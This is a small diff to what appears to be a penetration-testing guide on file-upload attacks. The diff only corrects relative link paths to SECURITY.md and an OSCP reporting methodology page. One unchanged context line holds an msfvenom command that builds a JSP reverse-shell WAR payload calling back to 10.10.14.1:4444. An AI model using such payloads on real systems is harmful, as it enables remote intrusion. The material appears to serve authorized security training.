@@ -4,7 +4,7 @@
 > (webshell, .htaccess, cron, authorized_keys) or served to other users.
 
 > [!CAUTION]
-> Authorized use only. See [../../SECURITY.md](../../SECURITY.md).
+> Authorized use only. See [../../SECURITY.md](../../../SECURITY.md).
 
 ---
 
@@ -366,7 +366,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f war > shel
 > File upload alone is not enough. Show that the upload leads to code
 > execution or to a sensitive file write (SSH key, cron).
 >
-> See [../../methodology/OSCP-Reporting.md](../../methodology/OSCP-Reporting.md).
+> See [../../methodology/OSCP-Reporting.md](../../../methodology/OSCP-Reporting.md).
 
 ---
 
